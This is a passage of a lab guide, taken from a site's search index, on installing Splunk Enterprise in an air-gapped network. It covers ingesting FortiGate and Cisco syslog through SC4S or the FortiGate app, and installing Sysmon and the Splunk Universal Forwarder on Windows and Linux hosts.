the air-gapped Ubuntu VM using a USB drive.</p>"},{"location":"splunk/splunk.html#on-the-air-gapped-environment","title":"On the Air-Gapped Environment","text":"<p>On the air-gapped VM, make a directory called <code>splunk-offline</code> and extract the transferred archive. This process may take some time.</p> <pre><code>mkdir ~/splunk-offline &amp;&amp; cd ~/splunk-offline\ntar -xzvf ~/splunk-offline.tar.gz\n</code></pre> <p>Install VM tools and its dependencies (this will enable copy and pasting and dynamic resolution). After installing VM tools, reboot the VM. </p> <pre><code>cd ~/splunk-offline/vmtools\nsudo dpkg -i *deb\n</code></pre> <p>Install Docker and its dependencies. Verify Installation.</p> <pre><code>cd ~/splunk-offline/docker\nsudo dpkg -i *\ndocker --version\n</code></pre> <p>Run <code>sudo service docker start</code></p> <pre><code>sudo service docker start\n</code></pre> <p>Run the following command to add your user to the <code>docker</code> group:</p> <pre><code>sudo usermod -aG docker $(whoami)\n</code></pre> <p>Reload the group membership for your current session with the following command:</p> <pre><code>newgrp docker\n</code></pre> <p>Check if you can run Docker commands without <code>sudo</code>:</p> <pre><code>docker ps\n</code></pre> <p>Install net-tools and verify installation.</p> <pre><code>cd ~/splunk-offline/nettools\nsudo dpkg -i *.deb\nifconfig\n</code></pre> <p>In a new tab as the standard user, set the host OS kernel to match the default receiver buffer of SC4S, which is set to 16MB. Add the following content to <code>/etc/sysctl.conf</code>:</p> <pre><code>sudo nano /etc/sysctl.conf\n</code></pre> <pre><code>net.core.rmem_default = 17039360\nnet.core.rmem_max = 17039360\n</code></pre> <p>Apply to the kernel by running the command  <code>sysctl -p</code></p> <pre><code>sudo sysctl -p\n</code></pre> <p>Ensure the kernel is not dropping packets. Please note that you may see some packet receive errors due to the air-gapped environment. These errors can be ignored.</p> <pre><code>netstat -su | grep \"receive errors\" \n</code></pre> <p>Extract the <code>splunk-offline</code> tar archive to the <code>/opt</code> directory.</p> <pre><code>cd ~/splunk-offline\nsudo tar xvzf splunk*.tgz -C /opt\n</code></pre> <p>Create user <code>splunk</code> and change ownership of <code>/opt/splunk</code> directory to the <code>splunk</code> user. Enter password and user information for the <code>splunk</code> user (use default values by pressing <code>enter</code> ). </p> <pre><code>sudo adduser splunk\n</code></pre> <p>If you are using CentOS, after adding user, go to settings &gt; Users. Unlock to Change Settings. Set password for the\u00a0<code>splunk</code>\u00a0user. Make the <code>splunk</code> user the owner of the <code>/opt/splunk</code> directory and verify the ownership.</p> <pre><code>sudo chown -R splunk:splunk /opt/splunk\ncd /opt\nls -la\n</code></pre> <pre><code>#Example output\ntotal 12\ndrwxr-xr-x  3 root   root   4096 Sep 18 15:36 .\ndrwxr-xr-x 20 root   root   4096 Sep 18 15:21 ..\ndrwxr-xr-x 11 **splunk splunk** 4096 Sep  6 05:58 splunk\n</code></pre> <p>Switch to <code>splunk</code> user and start Splunk Enterprise. When prompted, create admin credentials.</p> <pre><code>su splunk\n</code></pre> <pre><code>cd /opt/splunk/bin\n./splunk start --accept-license\n</code></pre> <pre><code>This appears to be your first time running this version of Splunk.\n\nSplunk software must create an administrator account during startup. Otherwise, you cannot log in.\nCreate credentials for the administrator account.\nCharacters do not appear on the screen when you type in credentials.\n\nPlease enter an administrator username: splunk #Create your username\nPassword must contain at least: #Create your password\n   * 8 total printable ASCII character(s).\nPlease enter a new password: \nPlease confirm new password: \n</code></pre> <p>In the <code>/opt/splunk/bin/</code> directory, configure Splunk to listen on port 9997</p> <pre><code>./splunk enable listen 9997\n</code></pre> <pre><code>#Example Output\nListening for Splunk data on TCP port 9997.\n</code></pre> <p>Navigate to <code>http://&lt;IP address&gt;:8000</code>on a web browser. Enter Splunk admin credentials. Verify that you can navigate the Splunk web interface.</p> <p></p> <p></p>"},{"location":"splunk/splunk.html#configuring-firewall-optional","title":"Configuring Firewall (Optional)","text":"<p>On Ubuntu, run the following command as a standard user in a new tab. This will configure and enable Firewall. In this lab, however, we will disable the firewall.</p> <pre><code>sudo ufw allow 514/tcp  # syslog TCP\nsudo ufw allow 514/udp  # syslog UDP\nsudo ufw allow 6514/tcp # syslog TLS\nsudo ufw allow 5425/tcp # syslog\nsudo ufw allow 601/tcp  # syslog\nsudo ufw allow 8000/tcp # Web UI Port\nsudo ufw allow 8080/tcp # HEC Port\nsudo ufw allow 8088/tcp # HEC Port\nsudo ufw allow 8089/tcp # Management Port\nsudo ufw allow 9997/tcp # Data flow\nsudo ufw allow 8065/tcp # Appserver\nsudo ufw allow 8191/tcp # KVstore\nsudo ufw enable\nsudo ufw reload\n</code></pre> <p>Alternatively, if you are on CentOS, run the following command to configure and enable Firewall:</p> <pre><code>sudo firewall-cmd --zone=public --add-port=514/tcp --permanent # syslog TCP\nsudo firewall-cmd --zone=public --add-port=514/udp --permanent # syslog UDP\nsudo firewall-cmd --zone=public --add-port=5514/udp --permanent # syslog UDP\nsudo firewall-cmd --zone=public --add-port=6514/tcp --permanent # syslog TLS\nsudo firewall-cmd --zone=public --add-port=5425/tcp --permanent # syslog\nsudo firewall-cmd --zone=public --add-port=601/tcp --permanent # syslog\nsudo firewall-cmd --zone=public --add-port=8000/tcp --permanent # Web UI Port\nsudo firewall-cmd --zone=public --add-port=8080/tcp --permanent # HEC port\nsudo firewall-cmd --zone=public --add-port=8088/tcp --permanent # HEC port\nsudo firewall-cmd --zone=public --add-port=8089/tcp --permanent # Managment Port\nsudo firewall-cmd --zone=public --add-port=9997/tcp --permanent # Data flow\nsudo firewall-cmd --zone=public --add-port=8065/tcp --permanent # appserver\nsudo firewall-cmd --zone=public --add-port=8191/tcp --permanent # kvstore\nsudo firewall-cmd --reload\nsudo firewall-cmd --list-all\n</code></pre>"},{"location":"splunk/splunk.html#configuring-fortigate","title":"Configuring FortiGate","text":"<p>Configure Port 1 as WAN interface and Port 2 as LAN interface. Set up DHCP to automatically assign IP addresses to clients connecting to the LAN.</p> <p></p> <p>Create a Firewall Policy to allow LAN to WAN. To simulate an air-gapped environment without internet access, the policy has been disabled.</p> <p></p> <p></p>"},{"location":"splunk/splunk.html#configuring-syslog-logging-on-fortigate","title":"Configuring Syslog Logging on FortiGate","text":"<p>On FortiGate Command-Line Interface (CLI), run the following commands to configure Syslog Server Settings:</p> <pre><code>config log syslogd setting\n    set status enable\n    set server &lt;syslog-ng IP&gt;\n    set source-ip &lt;FortiGate IP&gt;\n    # set port &lt;port number&gt;  (Default port is 514)\n    # Verify settings by running \"show\"\nend\n</code></pre> <p>Configure Log Memory Filter:</p> <pre><code>config log memory filter\n    set forward-traffic enable\n    set local-traffic enable\n    set sniffer-traffic disable\n    set anomaly enable\n    set voip disable\n    set multicast-traffic enable\n    # Verify settings by running \"show full-configuration\"\nend\n</code></pre> <p>Configure Global System Settings:</p> <pre><code>config system global\n    set cli-audit-log enable\n    # Verify settings by running \"show\"\n    # Ensure the timezone is correct, e.g., \"Pacific/Auckland\"\nend\n</code></pre> <p>Enable Logging for Neighbour Events:</p> <pre><code>config log setting\n    set neighbor-event enable\nend\n</code></pre>"},{"location":"splunk/splunk.html#configuring-syslog-logging-on-cisco-isr-optional","title":"Configuring Syslog Logging on Cisco ISR (Optional)","text":"<p>On Cisco Integrated Services Router\u2019s (ISR) CLI, run the following command to verify Clock and Configure NTP</p> <pre><code>show clock\nntp server &lt;FortiGate IP&gt;\n</code></pre> <p>Enable Syslog Logging:</p> <pre><code>conf t\nlogging on\nlogging &lt;Syslog Server IP&gt;\nlogging trap 6\n# Use \"?\" to see available options\nexit\n</code></pre> <p>Verify Logging:</p> <pre><code>show logging\n# Port 514/UDP is used by default\n</code></pre> <p>Check Current Logging Configuration:</p> <pre><code>sh run | inc logging\n# Multiple syslog servers can be configured\n</code></pre> <p>Set IP Address for VLAN 1 and Test Connectivity:</p> <pre><code>conf t\ninterface vlan 1\nip address &lt;IP Address&gt; &lt;Subnet Mask&gt;\nno shutdown\nexit\n\n# Test connectivity to the syslog server\nping &lt;Syslog Server IP&gt;\n</code></pre> <p>Enable Log Sequence Numbers:</p> <pre><code>conf t\nservice sequence-numbers\n# Assigns sequence numbers to syslog messages in the order events occur\n</code></pre> <p>Configure Console Logging:</p> <pre><code>conf t\nline console 0\nlogging synchronous\n# Ensures syslog messages are displayed properly after configuration\nend\n</code></pre>"},{"location":"splunk/splunk.html#ingesting-fortigate-logs","title":"Ingesting FortiGate Logs","text":"<p>To ingest FortiGate logs into Splunk, you have two options:</p> <p>Option 1: Ingest FortiGate logs through SC4S. Option 2: Ingest FortiGate logs through Splunk\u2019s FortiGate App.</p> <p>Please select one option, as using both options simultaneously is not recommended. However, for demonstration purposes, we will first go through Option 1, followed by Option 2.</p> <p></p>"},{"location":"splunk/splunk.html#ingesting-fortigate-logs-through-sc4s-option-1","title":"Ingesting FortiGate Logs through SC4S (Option 1)","text":"<p>SC4S is an open source packaged solution for getting data into Splunk. It is based on the syslog-ng Open Source Edition (Syslog-NG OSE) and transports data to Splunk via the Splunk HTTP event Collector (HEC) rather than writing events to disk for collection by a Universal Forwarder.</p>"},{"location":"splunk/splunk.html#creating-indexes-for-sc4s","title":"Creating Indexes for SC4S","text":"<p>On the Splunk VM, as the <code>splunk</code> user, create an <code>indexes.conf</code> in the <code>/opt/splunk/etc/system/local</code> directory. Copy and paste the following content. This step will create the default indexes that are used by SC4S. It is important that you do not edit <code>/opt/splunk/etc/system/default/indexes.conf</code></p> <pre><code>nano /opt/splunk/etc/system/local/indexes.conf\n</code></pre> <pre><code>[default]\nlastChanceIndex = main\n\n[email]\nhomePath   = $SPLUNK_DB/email/db\ncoldPath   = $SPLUNK_DB/email/colddb\nthawedPath = $SPLUNK_DB/email/thaweddb\n\n[epav]\nhomePath   = $SPLUNK_DB/epav/db\ncoldPath   = $SPLUNK_DB/epav/colddb\nthawedPath = $SPLUNK_DB/epav/thaweddb\n\n[epintel]\nhomePath   = $SPLUNK_DB/epintel/db\ncoldPath   = $SPLUNK_DB/epintel/colddb\nthawedPath = $SPLUNK_DB/epintel/thaweddb\n\n[_metrics]\ndatatype=metric\nhomePath   = $SPLUNK_DB/_metrics/db\ncoldPath   = $SPLUNK_DB/_metrics/colddb\nthawedPath = $SPLUNK_DB/_metrics/thaweddb\n\n[syslogng_fallback]\nhomePath   = $SPLUNK_DB/syslogng_fallback/db\ncoldPath   = $SPLUNK_DB/syslogng_fallback/colddb\nthawedPath = $SPLUNK_DB/syslogng_fallback/thaweddb\n\n[test]\nhomePath   = $SPLUNK_DB/test/db\ncoldPath   = $SPLUNK_DB/test/colddb\nthawedPath = $SPLUNK_DB/test/thaweddb\n\n[test2]\nhomePath   = $SPLUNK_DB/test2/db\ncoldPath   = $SPLUNK_DB/test2/colddb\nthawedPath = $SPLUNK_DB/test2/thaweddb\n\n[infraops]\nhomePath   = $SPLUNK_DB/infraops/db\ncoldPath   = $SPLUNK_DB/infraops/colddb\nthawedPath = $SPLUNK_DB/infraops/thaweddb\n\n[osnix]\nhomePath   = $SPLUNK_DB/osnix/db\ncoldPath   = $SPLUNK_DB/osnix/colddb\nthawedPath = $SPLUNK_DB/osnix/thaweddb\n\n[oswin]\nhomePath   = $SPLUNK_DB/oswin/db\ncoldPath   = $SPLUNK_DB/oswin/colddb\nthawedPath = $SPLUNK_DB/oswin/thaweddb\n\n[oswinsec]\nhomePath   = $SPLUNK_DB/oswinsec/db\ncoldPath   = $SPLUNK_DB/oswinsec/colddb\nthawedPath = $SPLUNK_DB/oswinsec/thaweddb\n\n[netauth]\nhomePath   = $SPLUNK_DB/netauth/db\ncoldPath   = $SPLUNK_DB/netauth/colddb\nthawedPath = $SPLUNK_DB/netauth/thaweddb\n\n[netdlp]\nhomePath   = $SPLUNK_DB/netdlp/db\ncoldPath   = $SPLUNK_DB/netdlp/colddb\nthawedPath = $SPLUNK_DB/netdlp/thaweddb\n\n[netdns]\nhomePath   = $SPLUNK_DB/netdns/db\ncoldPath   = $SPLUNK_DB/netdns/colddb\nthawedPath = $SPLUNK_DB/netdns/thaweddb\n\n[netfw]\nhomePath   = $SPLUNK_DB/netfw/db\ncoldPath   = $SPLUNK_DB/netfw/colddb\nthawedPath = $SPLUNK_DB/netfw/thaweddb\n\n[netids]\nhomePath   = $SPLUNK_DB/netids/db\ncoldPath   = $SPLUNK_DB/netids/colddb\nthawedPath = $SPLUNK_DB/netids/thaweddb\n\n[netipam]\nhomePath   = $SPLUNK_DB/netipam/db\ncoldPath   = $SPLUNK_DB/netipam/colddb\nthawedPath = $SPLUNK_DB/netipam/thaweddb\n\n[netops]\nhomePath   = $SPLUNK_DB/netops/db\ncoldPath   = $SPLUNK_DB/netops/colddb\nthawedPath = $SPLUNK_DB/netops/thaweddb\n\n[netproxy]\nhomePath   = $SPLUNK_DB/netproxy/db\ncoldPath   = $SPLUNK_DB/netproxy/colddb\nthawedPath = $SPLUNK_DB/netproxy/thaweddb\n\n[netwaf]\nhomePath   = $SPLUNK_DB/netwaf/db\ncoldPath   = $SPLUNK_DB/netwaf/colddb\nthawedPath = $SPLUNK_DB/netwaf/thaweddb\n\n[email]\nhomePath   = $SPLUNK_DB/email/db\ncoldPath   = $SPLUNK_DB/email/colddb\nthawedPath = $SPLUNK_DB/email/thaweddb\n\n[netlb]\nhomePath   = $SPLUNK_DB/netlb/db\ncoldPath   = $SPLUNK_DB/netlb/colddb\nthawedPath = $SPLUNK_DB/netlb/thaweddb\n</code></pre> <p>In the<code>/opt/splunk/bin</code> directory, restart Splunk Enterprise as the <code>splunk</code> user.</p> <pre><code>./splunk restart\n</code></pre> <p>On the Splunk web interface, navigate to Settings, then Indexes. Verify that the SC4S default indexes have been created. Use the filter search bar to find indexes if needed.</p> <p></p>"},{"location":"splunk/splunk.html#creating-a-hec-token","title":"Creating a HEC Token","text":"<p>On the Splunk Web UI, navigate to Settings &gt; Data Inputs &gt; HTTP Event Collector &gt; Global Settings. Select Enabled for All Tokens. Set main as the Default Index. Uncheck Enable SSL. Leave the HTTP Port Number as 8088. Click Save.</p> <p></p> <p>Click New Token, name it 'sc4s_token', and click Next.</p> <p></p> <p>Leave Source Type as Automatic. Leave Selected Allowed Indexes blank. Select main as the Default Index. Click Review, then Submit.</p> <p></p> <p>Copy your Token Value and save it in a notepad (you will need this later). You can also find your token value under Settings &gt; Data Inputs &gt; HTTP Event Collector.</p> <p></p> <p></p>"},{"location":"splunk/splunk.html#loading-sc4s-container-image","title":"Loading SC4S Container Image","text":"<p>In a tab, as a standard user, use Docker to load the SC4S container image. Make a note of the container ID and image name. If you are using CentOS, replace <code>docker</code> with <code>podman</code></p> <pre><code>cd ~/splunk-offline/sc4s\nsudo docker load &lt; oci_container.tar.gz\n</code></pre> <pre><code>#Example output\nLoaded image: ghcr.io/splunk/splunk-connect-for-syslog/container3:3.34.3\n</code></pre> <p>Use the container ID to create a local label using docker. </p> <pre><code>sudo docker tag ghcr.io/splunk/splunk-connect-for-syslog/container3:3.34.3 sc4slocal:latest\n</code></pre> <p>Create the systemd unit file\u00a0<code>/lib/systemd/system/sc4s.service</code> and copy and paste the following content:</p> <pre><code>sudo nano /lib/systemd/system/sc4s.service\n</code></pre> <pre><code>[Unit]\nDescription=SC4S Container\nWants=NetworkManager.service network-online.target docker.service\nAfter=NetworkManager.service network-online.target docker.service\nRequires=docker.service\n\n[Install]\nWantedBy=multi-user.target\n\n[Service]\nEnvironment=\"SC4S_IMAGE=sc4slocal:latest\"\n\n# Required mount point for syslog-ng persist data (including disk buffer)\nEnvironment=\"SC4S_PERSIST_MOUNT=splunk-sc4s-var:/var/lib/syslog-ng\"\n\n# Optional mount point for local overrides and configurations; see notes in docs\nEnvironment=\"SC4S_LOCAL_MOUNT=/opt/sc4s/local:/etc/syslog-ng/conf.d/local:z\"\n\n# Optional mount point for local disk archive (EWMM output) files\nEnvironment=\"SC4S_ARCHIVE_MOUNT=/opt/sc4s/archive:/var/lib/syslog-ng/archive:z\"\n\n# Map location of TLS custom TLS\nEnvironment=\"SC4S_TLS_MOUNT=/opt/sc4s/tls:/etc/syslog-ng/tls:z\"\n\nTimeoutStartSec=0\n\n#ExecStartPre=/usr/bin/docker pull $SC4S_IMAGE\n\n# Note: /usr/bin/bash will not be valid path for all OS\n# when startup fails on running bash check if the path is correct\nExecStartPre=/usr/bin/bash -c \"/usr/bin/systemctl set-environment SC4SHOST=$(hostname -s)\"\n\n# Note: Prevent the error 'The container name \"/SC4S\" is already in use by container &lt;container_id&gt;. You have to remove (or rename) that container to be able to reuse that name.'\nExecStartPre=/usr/bin/bash -c \"/usr/bin/docker rm SC4S &gt; /dev/null 2&gt;&amp;1 || true\"\nExecStart=/usr/bin/docker run \\\n        -e \"SC4S_CONTAINER_HOST=${SC4SHOST}\" \\\n        -v \"$SC4S_PERSIST_MOUNT\" \\\n        -v \"$SC4S_LOCAL_MOUNT\" \\\n        -v \"$SC4S_ARCHIVE_MOUNT\" \\\n        -v \"$SC4S_TLS_MOUNT\" \\\n        --env-file=/opt/sc4s/env_file \\\n        --network host \\\n        --name SC4S \\\n        --rm $SC4S_IMAGE\n\nRestart=on-failure\n</code></pre>"},{"location":"splunk/splunk.html#configuring-ipv4-forwarding","title":"Configuring IPv4 forwarding","text":"<p>IPv4 forwarding is not enabled by default. IPv4 forwarding must be enabled for container networking.</p> <p>To check that IPv4 forwarding is enabled:\u00a0</p> <pre><code>sudo sysctl net.ipv4.ip_forward\n</code></pre> <p>To enable IPv4 forwarding:\u00a0</p> <pre><code>sudo sysctl net.ipv4.ip_forward=1\n</code></pre> <p>To ensure your changes persist upon reboot, define sysctl settings through files in\u00a0<code>/usr/lib/sysctl.d/</code> and\u00a0<code>/etc/sysctl.d/</code>. To override only specific settings, either add a file with a lexically later name in\u00a0<code>/etc/sysctl.d/</code>\u00a0and put following setting there or find this specific setting in one of the existing configuration files and set the value to\u00a0<code>1</code>. </p> <pre><code>cd /usr/lib/sysctl.d/\nsudo nano 100-custom.conf\n</code></pre> <pre><code>net.ipv4.ip_forward=1\n</code></pre> <pre><code>cyber@Splunk:/usr/lib/sysctl.d$ ls\n100-custom.conf  10-apparmor.conf  30-tracker.conf  50-bubblewrap.conf  50-pid-max.conf  99-protect-links.conf\n</code></pre> <p>Repeat the same steps for <code>/etc/sysctl.d/</code>.</p> <pre><code>cd /etc/sysctl.d/\nsudo nano 100-custom.conf\n</code></pre> <pre><code>net.ipv4.ip_forward=1\n</code></pre> <pre><code>cyber@Splunk:/etc/sysctl.d$ ls\n100-custom.conf           10-ipv6-privacy.conf      10-magic-sysrq.conf  10-network-security.conf  10-zeropage.conf  README.sysctl\n10-console-messages.conf  10-kernel-hardening.conf  10-map-count.conf    10-ptrace.conf            99-sysctl.conf\n</code></pre> <p>Create a Docker volume for SC4S disk buffer and state files.</p> <pre><code>sudo docker volume create splunk-sc4s-var\n</code></pre> <p>Create directories to be used as a mount point for local overrides and configurations:</p> <pre><code>sudo mkdir -p /opt/sc4s/local\nsudo mkdir -p /opt/sc4s/archive\nsudo mkdir -p /opt/sc4s/tls\n</code></pre> <p>Create the environment file\u00a0<code>/opt/sc4s/env_file</code>\u00a0and replace the HEC_URL and HEC_TOKEN as necessary:</p> <pre><code>sudo nano /opt/sc4s/env_file\n</code></pre> <pre><code>SC4S_DEST_SPLUNK_HEC_DEFAULT_URL=http://10.0.0.100:8088\nSC4S_DEST_SPLUNK_HEC_DEFAULT_TOKEN=(HEC_Token_value)\n#Uncomment the following line if using untrusted SSL certificates\nSC4S_DEST_SPLUNK_HEC_DEFAULT_TLS_VERIFY=no\n</code></pre>"},{"location":"splunk/splunk.html#testing-sc4s","title":"Testing SC4S","text":"<p>Enable and start SC4S. Verify SC4S is active and running (exit with <code>q</code>).</p> <pre><code>sudo systemctl daemon-reload\nsudo systemctl enable sc4s\nsudo systemctl start sc4s\nsudo systemctl status sc4s\n</code></pre> <p>Check Docker logs for errors:</p> <pre><code>sudo docker logs SC4S\n</code></pre> <pre><code>#Example Output\nSC4S_ENV_CHECK_HEC: Splunk HEC connection test successful to index=main for sourcetype=sc4s:fallback...\nSC4S_ENV_CHECK_HEC: Splunk HEC connection test successful to index=main for sourcetype=sc4s:events...\nsyslog-ng checking config\nsc4s version=3.30.0\nstarting goss\nstarting syslog-ng\n</code></pre> <p>Search on Splunk for successful installation of SC4S. Make sure to select \u201cAll time.\u201d</p> <pre><code>index=* sourcetype=sc4s:events \"starting up\"\n</code></pre> <p></p> <p>Send sample data to UDP port 514: </p> <pre><code>echo \"Hello SC4S\" &gt; /dev/udp/10.0.0.100/514\n</code></pre> <p>Search in Splunk to verify successful receipt of sample data on UDP port 514:</p> <pre><code>index=* \"Hello SC4S\"\n</code></pre> <p></p> <p>Earlier, we configured FortiGate to send logs on UDP port 514. Since SC4S is configured to receive logs on UDP port 514, we should now see FortiGate logs. Verify that SC4S is receiving FortiGate event and traffic logs with source <code>sc4s</code>. It may take some time for the logs to appear.</p> <pre><code>index=* sourcetype=fgt_event\n</code></pre> <p></p> <pre><code>index=* sourcetype=fgt_traffic\n</code></pre> <p></p>"},{"location":"splunk/splunk.html#ingesting-fortigate-logs-through-fortigate-app-option-2","title":"Ingesting FortiGate Logs through FortiGate App (Option 2)","text":"<p>If SC4S does not work for your environment, another option to ingest FortiGate logs on Splunk is through FortiGate App. On Splunk web UI, navigate to Manage Apps, then Install from file. Upload the FortiGate App (tar archive) from <code>~/splunk-offline/apps</code> directory. Check the upgrade box. </p> <p></p>"},{"location":"splunk/splunk.html#adding-udp-data-input","title":"Adding UDP Data Input","text":"<p>Navigate to Settings, Data Inputs, then UDP on Splunk Web UI. Click New Local UDP. For Port, enter <code>5514</code> and leave other parameters as is. We are using port 5514 for demonstration purposes as port 514 is being used by SC4S. If you are not using SC4S, you can put port 514 here.</p> <p></p> <p>For Source type, search and select <code>fortigate_log</code> .</p> <p></p> <p>Click Review and Submit. If you get the error <code>UDP 514 is not available</code> use other UDP port (e.g. <code>5514</code>). Restart Splunk Enterprise as the <code>splunk</code> user for the change to take effect.</p> <pre><code>cd /opt/splunk/bin\n./splunk restart\n</code></pre>"},{"location":"splunk/splunk.html#configuring-syslog-logging-on-fortigate-udp-5514","title":"Configuring Syslog Logging on FortiGate (UDP 5514)","text":"<p>Configure FortiGate to send syslog to port 5514 by running the following command. Ensure you enter the correct port number. When prompted, confirm the port number.</p> <pre><code>FGVMEVMBF57GNJF3 # config log syslogd setting\n\nFGVMEVMBF57GNJF3 (setting) # set port 5514\n\nFGVMEVMBF57GNJF3 (setting) # show\nconfig log syslogd setting\n    set status enable\n    set server \"10.0.0.100\"\n    set port 5514\n    set source-ip \"10.0.0.1\"\nend\n\nFGVMEVMBF57GNJF3 (setting) # end\nPort 5514 is different from default port 514.\nConfirm to use port 5514 instead?\nDo you want to continue? (y/n)y\n\nPort set to 5514\n\nFGVMEVMBF57GNJF3 # \n</code></pre>"},{"location":"splunk/splunk.html#testing-fortigate-app","title":"Testing FortiGate App","text":"<p>Navigate to Search &amp; Reporting on Splunk web UI. Search for <code>index=*</code> and verify that you can see <code>fortigate_traffic</code> and <code>fortigate_event</code> as source type. Verify that most recent log\u2019s source is <code>udp 5514</code>. If the source is still pointing to <code>sc4s</code>, restart the Splunk. </p> <p></p> <p>Search for <code>index=* sourcetype=fortigate_traffic</code> and <code>index=* sourcetype=fortigate_traffic</code>. Verify that most recent log\u2019s source is <code>udp 5514</code> .</p> <p></p> <p></p>"},{"location":"splunk/splunk.html#installing-sysmon-on-windows","title":"Installing Sysmon on Windows","text":"<p>Download Sysmon and sysmonconfig.xml. Extract Sysmon.zip and move sysmonconfig.xml into the Sysmon folder where Sysmon.exe is located. Run PowerShell as Administrator and change directory to path where extracted Sysmon is located. Install Symon by running the following command:</p> <pre><code>.\\Sysmon64.exe -accepteula -i sysmonconfig.xml\n</code></pre> <pre><code>#Example output\n\nPS C:\\Users\\Administrator\\Downloads\\Sysmon\\Sysmon&gt; ls\n\n    Directory: C:\\Users\\Administrator\\Downloads\\Sysmon\\Sysmon\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n------        7/23/2024   2:08 PM           7490 Eula.txt\n------        7/23/2024   2:08 PM        8480560 Sysmon.exe\n------        7/23/2024   2:08 PM        4563248 Sysmon64.exe\n------        7/23/2024   2:08 PM        4993440 Sysmon64a.exe\n-a----        8/26/2024   7:31 PM         123257 sysmonconfig.xml\n\nPS C:\\Users\\Administrator\\Downloads\\Sysmon\\Sysmon&gt; .\\Sysmon64.exe -accepteula -i .\\sysmonconfig.xml\n\nSystem Monitor v15.15 - System activity monitor\nBy Mark Russinovich and Thomas Garnier\nCopyright (C) 2014-2024 Microsoft Corporation\nUsing libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.\nSysinternals - www.sysinternals.com\n\nLoading configuration file with schema version 4.50\nSysmon schema version: 4.90\nConfiguration file validated.\nSysmon64 installed.\nSysmonDrv installed.\nStarting SysmonDrv.\nSysmonDrv started.\nStarting Sysmon64..\nSysmon64 started.\n</code></pre> <p>Verify that Sysmon is installed by checking Services (Sysmon64) and Windows Event Viewer (Applications and Services Logs &gt; Microsoft &gt; Windows &gt; Sysmon). </p> <p></p> <p></p>"},{"location":"splunk/splunk.html#installing-splunk-uf-on-windows","title":"Installing Splunk UF on Windows","text":"<p>For installing the Splunk Universal Forwarder (UF) on Windows, there are three options:</p> <p>Option 1: Install with a Domain Account</p> <p>This option worked successfully in my lab without any issues; however, it requires additional configuration steps.</p> <p>Option 2: Install with a Virtual Account (Annex 1)</p> <p>This is Splunk\u2019s recommended approach, but I encountered issues despite troubleshooting the errors.</p> <p>Option 3: Install with the Local System Account</p> <p>While not a security best practice, this option works reliably without any issues.</p> <p>This documentation covers Options 1 and 2, as Option 3 follows a similar process. Please choose the option that works best for your requirements.</p> <p></p>"},{"location":"splunk/splunk.html#installing-splunk-uf-with-a-domain-account-option-1","title":"Installing Splunk UF with a Domain Account (Option 1)","text":""},{"location":"splunk/splunk.html#creating-a-domain-account","title":"Creating a Domain Account","text":"<p>In this lab, WS2019 host is joined to a domain called <code>cyber.local</code> and promoted as a domain controller. This step is applicable to a domain-joined environment. Create a domain user called <code>splunk</code> and assign it as a member of <code>Event Log Readers Group</code>. This account will be used to run Splunk Forwarder. </p> <ul> <li>Go to Active Directory Users and Computers &gt; domain &gt; Users</li> <li>Right-click Users &gt; New &gt; User</li> <li>First name: splunk</li> <li>Last name: (blank)</li> <li>Full name: splunk</li> <li>User logon name: splunk</li> <li>Right-click splunk user &gt; Properties &gt; Member of &gt; Add &gt; put <code>Event Log Readers</code> and click Check Names &gt; OK &gt; Apply and OK</li> </ul> <p></p>"},{"location":"splunk/splunk.html#configuring-rdp-optional","title":"Configuring RDP (Optional)","text":"<p>In this lab, RDP configuration was required for the <code>splunk</code> user to login to WS2019 host. This step is optional. Open Local Group Policy Editor by clicking Run &gt; type <code>gpedit.msc</code> . In the Local Group Policy Editor, navigate to Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment &gt; Allow log on through Remote Desktop Services. Add user <code>splunk</code>.</p> <p></p> <p>In the Local Group Policy Editor, navigate to Computer configuration &gt; Administrative Templates &gt; Windows Components &gt; Remote Desktop Services &gt; Remote Desktop Session Host &gt; Connections &gt; Allow users to connect remotely by using Remote Desktop Services &gt;Enabled.</p> <p></p> <p>Navigate to Remote Desktop Session Host &gt; Security &gt; Require user authentication for remote connections by using Network Level Authentication &gt; Enabled.</p> <p></p> <p>In Server Manager, go to Local Server. Make sure Remote Desktop is Enabled. Click <code>Enabled</code> next to Remote Desktop.  Click Select Users. Add user <code>splunk</code>.</p> <p></p> <p>Enable inbound firewall rules related to Remote Desktop.</p> <p></p> <p>RDP into <code>WS2019</code> host as the <code>splunk</code> user from another internal host.</p>"},{"location":"splunk/splunk.html#configuring-splunk-uf-on-windows","title":"Configuring Splunk UF on Windows","text":"<p>Download and transfer the Splunk Universal Forwarder (UF) (msi) for Windows. Run Universal Forwarder (msi), accept license, select on-premise Splunk Enterprise instance, and click Customize Options.</p> <p></p> <p>Leave Path as default and click Next</p> <p></p> <p>Leave Certificate Password empty and click Next</p> <p></p> <p>Select Domain Account.  </p> <p></p> <p>Specify domain\\splunk and password for the account.</p> <p></p> <p>Leave permissions as default.</p> <p></p> <p>Leave everything unchecked and click Next.</p> <p></p> <p>Create credentials for the administrator account. </p> <p></p> <p>Enter IP address of Deployment Server (Splunk server) and port 8089. Note the IP address in the screenshot is different to the lab setup. </p> <p></p> <p>Enter IP address of Receiving Indexer (Splunk server) and port 9997.</p> <p></p> <p>Click Install. Click Finish after install is complete.</p> <p></p>"},{"location":"splunk/splunk.html#creating-a-new-outbound-firewall-rule","title":"Creating a New Outbound Firewall Rule","text":"<p>Navigate to Windows Defender Firewall with Advanced Security. Right-click on Outbound Rules and select New Rule. Select Program as Rule Type.</p> <p></p> <p>For program path, browse to C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunkd.exe</p> <p></p> <p>Select Allow the Connection.</p> <p></p> <p>Check all boxes for Domain, Private and Public.</p> <p></p> <p>Name the rule as Splunk outbound</p> <p></p>"},{"location":"splunk/splunk.html#verifying-agent-connection-on-windows","title":"Verifying Agent Connection on Windows","text":"<p>Verify that yours Windows host is connected to the Deployment Server. On the Splunk Enterprise web UI, go to Settings &gt; Forwarder Management. You should be able to see your Windows client. </p> <p></p> <p></p>"},{"location":"splunk/splunk.html#installing-splunk-uf-on-linux","title":"Installing Splunk UF on Linux","text":"<p>Download and transfer Splunk UF (tar archive) for Linux. Unpack the tar archive to /opt directory as a standard user.</p> <pre><code>sudo tar xvzf splunkforwarder*.tgz -C /opt\n</code></pre> <p>Create a user called <code>splunk</code> and change the ownership of <code>/opt/splunkforwarder</code> to the <code>splunk</code> user.</p> <pre><code>sudo adduser splunk\n</code></pre> <pre><code>sudo chown -R splunk:splunk 